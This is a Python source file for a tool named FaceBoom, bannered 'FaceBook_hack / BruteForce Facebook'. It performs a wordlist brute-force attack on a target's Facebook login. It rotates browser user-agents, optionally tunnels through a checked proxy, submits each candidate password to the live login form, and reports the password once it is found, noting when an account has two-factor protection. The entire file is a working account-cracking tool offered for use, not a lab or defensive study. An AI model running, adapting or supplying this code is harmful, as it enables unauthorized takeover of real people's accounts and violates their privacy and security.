from libraries import *
class FaceBoom(object):


    def __init__(self):
        self.useProxy = None
        self.br = mechanize.Browser()
        self.br.set_handle_robots(False)
        self.br._factory.is_html = True
        self.br.addheaders=[('User-agent',random.choice([
               'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
               'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.70',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
               'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
               'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
               'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
               'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 Edg/100.0.1185.36',
               'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0',
               'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']))]


    @staticmethod
    def check_proxy(proxy):
        # Create a dictionary with proxy information for both HTTP and HTTPS
        proxies = {'https': "https://" + proxy, 'http': "http://" + proxy}
    
        # Extract the IP address from the proxy string
        proxy_ip = proxy.split(":")[0]

        try:
            # Attempt to make a request to 'https://www.wikipedia.org' using the provided proxy
            # The request is made to Wikipedia because it's often used to check if a proxy is accessible
            r = requests.get('https://www.wikipedia.org', proxies=proxies, timeout=5)
    
            # Check if the proxy response contains the expected X-Client-IP header with the proxy IP
            if proxy_ip == r.headers.get('X-Client-IP', ''):
                return True  # The proxy is working as expected
            return False  # The proxy response doesn't match the expected IP
        except Exception:
            return False  # An exception occurred, indicating a potential issue with the proxy

    @staticmethod
    def cnet():
        try:
            socket.create_connection((socket.gethostbyname("www.google.com"), 80), timeout=2)
            return True
        except socket.error:pass
        return False


    def login(self, target, passwored):
        try:
            # Opening the Facebook login page using the mechanize browser
            self.br.open("https://facebook.com")

            # Selecting the login form (assuming it is the first form on the page, nr=0)
            self.br.select_form(nr=0)

            # Filling in the login credentials
            self.br.form['email'] = target
            self.br.form['pass'] = passwored

            # Setting the HTTP method to POST
            self.br.method = "POST"

            # Submitting the login form
            if self.br.submit().get_data().__contains__(b'home_icon'):
                return 1  # If the submission is successful, return 1

            # If the login triggers a checkpoint (e.g., two-factor authentication)
            elif "checkpoint" in self.br.geturl():
                return 2  # Return 2 to indicate a checkpoint situation

            # If neither condition is met, return 0 to indicate login failure
            return 0

        except (KeyboaREDInterrupt, EOFError):
            # Handling keyboaRED interrupt or end-of-file error
            print(RED + "\n[" + YELLOW + "!" + RED + "]" + YELLOW + " Aborting" + RED + "..." + WHITE)
            time.sleep(1.5)
            sys.exit(1)

        except Exception as e:
            # Handling other exceptions
            print(f'Enter to check other expection')
            print(RED + " Error: " + YELLOW + str(e) + WHITE + "\n")
            time.sleep(0.60)


    def banner(self, target, wordlist, single_passwd):
        proxystatus = GREEN + (self.useProxy + WHITE + "[" + GREEN + "ON" + WHITE + "]") if self.useProxy else YELLOW + "[" + RED + "OFF" + YELLOW + "]"
        print(f'''{GREEN}
    ==================================
    [---]   {WHITE}FaceBook_hack{GREEN}        [---]
    ==================================
    [---]  {WHITE}BruteForce Facebook  {GREEN} [---]
    ==================================
    [---]         {YELLOW}CONFIG{BLUE}         [---]
    ==================================
    [>] Target      :> {WHITE}{target}{GREEN}
    {'[>] wordlist    :> ' + BLUE + str(wordlist) if not single_passwd else '[>] Passwored    :> ' + BLUE + str(single_passwd)}{GREEN}
    [>] ProxyStatus :> {str(proxystatus)}
    ''')
        if not single_passwd:
            print(f'''{GREEN}
    ====================================
    [~] {YELLOW}Brute{RED} ForceATTACK: {GREEN}Enabled {WHITE}[~] {GREEN}
    ====================================\n''')
        else:
            print("\n")


def Main(target,wordlist,single_passwd,proxy):
    faceboom = FaceBoom()

    opts = [target, wordlist, single_passwd, proxy]

    if any(opt for opt in opts):
        if not faceboom.cnet():
            errMsg("Please Check Your Internet Connection")
            sys.exit(1)

    faceboom.banner(target, wordlist, single_passwd)

    if wordlist or single_passwd:
        if wordlist:
            if not os.path.isfile(wordlist):
                errMsg("Please check Your wordlist Path")
                sys.exit(1)
        if single_passwd:
            if len(single_passwd.strip()) < 6:
                errMsg(RED+"Invalid Passwored")
                print(BLUE+"[!] "+RED+"Passwored must be at least '6' characters long")
                sys.exit(1)

        if proxy:
            if proxy.count(".") != 3:
                errMsg("Invalid IPv4 [" + RED + str(proxy) + YELLOW + "]")
                sys.exit(1)
            print(WHITE + "[" + YELLOW + "~" + WHITE + "] Connecting To " + WHITE + "Proxy[\033[1;33m {} \033[1;37m]...".format(
                proxy if not ":" in proxy else proxy.split(":")[0]))
            final_proxy = proxy + ":8080" if not ":" in proxy else proxy
            if faceboom.check_proxy(final_proxy):
                faceboom.useProxy = final_proxy
                faceboom.br.set_proxies({'https': faceboom.useProxy, 'http': faceboom.useProxy})
                print(WHITE + "[" + GREEN + "Connected" + WHITE + "]")
            else:
                errMsg("Connection Failed")
                errMsg("Unable to connect to Proxy[" + RED + str(proxy) + YELLOW + "]")
                sys.exit(1)

        loop = 1 if not single_passwd else "~"
        if single_passwd:
            passwords = [single_passwd]
        else:
            with io.open(wordlist, 'r', errors='replace') as f:
                passwords = f.readlines()

        for passwd in passwords:
            passwd = passwd.strip()
            if len(passwd) < 6:
                continue
            write(WHITE + "[" + YELLOW + str(loop) + WHITE + "] Trying Passwored[ {" + YELLOW + str(passwd) + WHITE + "} ]")
            retCode = faceboom.login(target, passwd)
            print(retCode)
            if retCode:
                sys.stdout.write(WHITE + " ==> Login" + GREEN + " Success\n")
                print(WHITE + "=========================" + "=" * len(passwd) + "======")
                print(WHITE + "[" + GREEN + "+" + WHITE + "] Passwored [ " + GREEN + passwd + WHITE + " ]" + GREEN + " Is Correct :)")
                print(WHITE + "=========================" + "=" * len(passwd) + "======")
                if retCode == 2: print(
                    WHITE + "[" + YELLOW + "!" + WHITE + "]" + YELLOW + " Warning: This account use (" + RED + "2F Authentication" + YELLOW + "):" + RED + " It's Locked" + YELLOW + " !!!")
                break
            else:
                sys.stdout.write(YELLOW + " ==> Login" + RED + " Failed\n")
                loop = loop + 1 if not single_passwd else "~"
        else:
            if single_passwd:
                print(
                    YELLOW + "\n[" + RED + "!" + YELLOW + "]" + WHITE + " Sorry: " + WHITE + "The Passwored[ " + YELLOW + passwd + WHITE + " ] Is Not Correct" + RED + ":(" + YELLOW + "!" + WHITE)
                print(GREEN + "[" + YELLOW + "!" + GREEN + "]" + YELLOW + " Please Try Another passwored or wordlist " + GREEN + ":)" + WHITE)
            else:
                print(YELLOW + "\n[" + RED + "!" + YELLOW + "]" + WHITE + " Sorry: " + WHITE + "I Can't Find The Correct Passwored In [ " + YELLOW + wordlist + WHITE + " ] " + RED + ":(" + YELLOW + "!" + WHITE)
                print(gr + "[" + YELLOW + "!" + GREEN + "]" + YELLOW + " Please Try Another wordlist. " + GREEN + ":)" + WHITE)
        sys.exit(1)
    else:
        print("Invalid Input. Please provide at least one option.")
        sys.exit(1)
